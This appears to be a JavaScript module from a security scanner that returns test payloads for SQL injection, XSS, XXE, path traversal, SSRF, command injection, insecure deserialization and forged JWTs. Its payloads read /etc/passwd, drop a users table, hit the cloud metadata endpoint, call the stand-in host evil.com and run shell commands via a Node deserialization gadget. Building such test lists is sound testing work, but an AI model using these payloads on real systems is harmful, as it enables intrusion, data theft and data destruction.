/**
 * Generates security test payloads for different vulnerability types
 */

/**
 * Generate SQL injection test payloads
 * @returns {Array<String>} - SQL injection test payloads
 */
function generateSqlInjectionPayloads() {
    return [
      "' OR '1'='1", 
      "' OR 1=1 --", 
      "' UNION SELECT NULL, username, password FROM users --",
      "'; DROP TABLE users; --",
      "' OR '1'='1' UNION SELECT NULL, table_name, NULL FROM information_schema.tables --",
      "admin' --"
    ];
  }
  
  /**
   * Generate XSS test payloads
   * @returns {Array<String>} - XSS test payloads
   */
  function generateXssPayloads() {
    return [
      "<script>alert('XSS');</script>",
      "<img src='x' onerror='alert(\"XSS\")'>",
      "<svg onload='alert(\"XSS\")'>",
      "\"><script>alert('XSS')</script>",
      "javascript:alert('XSS')",
      "<body onload='alert(\"XSS\")'>",
      "';alert('XSS');//"
    ];
  }
  
  /**
   * Generate XML external entity (XXE) payloads
   * @returns {Array<String>} - XXE test payloads
   */
  function generateXxePayloads() {
    return [
      `<?xml version="1.0" encoding="ISO-8859-1"?>
       <!DOCTYPE foo [
         <!ELEMENT foo ANY>
         <!ENTITY xxe SYSTEM "file:///etc/passwd">
       ]>
       <foo>&xxe;</foo>`,
      
      `<?xml version="1.0" encoding="ISO-8859-1"?>
       <!DOCTYPE foo [
         <!ELEMENT foo ANY>
         <!ENTITY xxe SYSTEM "file:///dev/random">
       ]>
       <foo>&xxe;</foo>`,
      
      `<?xml version="1.0" encoding="ISO-8859-1"?>
       <!DOCTYPE foo [
         <!ELEMENT foo ANY>
         <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
         %xxe;
       ]>
       <foo>&data;</foo>`
    ];
  }
  
  /**
   * Generate path traversal attack payloads
   * @returns {Array<String>} - Path traversal test payloads
   */
  function generatePathTraversalPayloads() {
    return [
      "../../../etc/passwd",
      "..%2f..%2f..%2fetc%2fpasswd",
      "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
      "....//....//....//etc/passwd",
      "/var/www/../../etc/passwd",
      "../../../../etc/passwd%00",
      "../../../../etc/passwd\0",
      "..\\..\\..\\windows\\system.ini"
    ];
  }
  
  /**
   * Generate SSRF attack payloads
   * @returns {Array<String>} - SSRF test payloads
   */
  function generateSsrfPayloads() {
    return [
      "http://127.0.0.1:22",
      "http://localhost:3306",
      "http://[::]:80/",
      "http://169.254.169.254/latest/meta-data/",
      "http://example.com@127.0.0.1",
      "http://127.0.0.1/",
      "file:///etc/passwd",
      "dict://127.0.0.1:11211/stats"
    ];
  }
  
  /**
   * Generate command injection payloads
   * @returns {Array<String>} - Command injection test payloads
   */
  function generateCommandInjectionPayloads() {
    return [
      "; cat /etc/passwd",
      "& dir",
      "| cat /etc/passwd",
      "`cat /etc/passwd`",
      "$(cat /etc/passwd)",
      "; ping -c 3 evil.com",
      "&& whoami",
      "|| echo vulnerable"
    ];
  }
  
  /**
   * Generate serialized objects for insecure deserialization testing
   * @returns {Object} - Mapping of language to serialized payloads
   */
  function generateDeserializationPayloads() {
    return {
      php: [
        'O:8:"TestClass":0:{}',
        'a:1:{s:4:"test";O:8:"TestClass":0:{}}',
        'O:22:"PhpObject":1:{s:10:"output_file";s:10:"/tmp/shell";}'
      ],
      java: [
        'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAABdAADZm9vdAADYmFy',
        'rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyABVjb20uYXBwLlRlc3RDbGFzc05hbWUAAAAAAAAAAQIAAHhweA=='
      ],
      node: [
        '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}',
        '{"__proto__":{"polluted":"yes"}}',
        '{"constructor":{"prototype":{"polluted":"yes"}}}'
      ]
    };
  }
  
  /**
   * Generate JWT test tokens with common vulnerabilities
   * @returns {Array<String>} - Vulnerable JWT tokens
   */
  function generateJwtPayloads() {
    return [
      // None algorithm
      'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.',
      // Weak signature
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjY',
      // Expired token
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiZXhwIjoxNTE2MjM5MDIyfQ.4Adcj3UFYzPUVaVF43FmMab6RlaQD8A9V8wFzzht-KQ'
    ];
  }
  
  /**
   * Get payloads for specific vulnerability type
   * @param {String} type - Vulnerability type
   * @returns {Array|Object} - Payloads for the specified vulnerability
   */
  function getPayloadsForType(type) {
    const payloadGenerators = {
      sql_injection: generateSqlInjectionPayloads,
      xss: generateXssPayloads,
      xxe: generateXxePayloads,
      path_traversal: generatePathTraversalPayloads,
      ssrf: generateSsrfPayloads,
      command_injection: generateCommandInjectionPayloads,
      insecure_deserialization: generateDeserializationPayloads,
      jwt: generateJwtPayloads
    };
  
    if (payloadGenerators[type]) {
      return payloadGenerators[type]();
    }
    
    return [];
  }
  
  module.exports = {
    generateSqlInjectionPayloads,
    generateXssPayloads,
    generateXxePayloads,
    generatePathTraversalPayloads,
    generateSsrfPayloads,
    generateCommandInjectionPayloads,
    generateDeserializationPayloads,
    generateJwtPayloads,
    getPayloadsForType
  };